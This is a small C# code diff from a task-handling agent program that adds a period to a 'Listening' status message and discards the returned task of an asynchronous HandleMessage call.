@@ -36,7 +36,7 @@ namespace Agent
                     await messageManager.AddResponse(new ResponseResult()
                     {
                         task_id = job.task.id,
-                        user_output = "Listening",
+                        user_output = "Listening.",
                         completed = true
                     });
                     return;
@@ -57,7 +57,7 @@ namespace Agent
             {
                 if (connection.Value.HasClient(sm.server_id))
                 {
-                    connection.Value.HandleMessage(sm);
+                    _ = connection.Value.HandleMessage(sm);
                     break;
                 }
             }
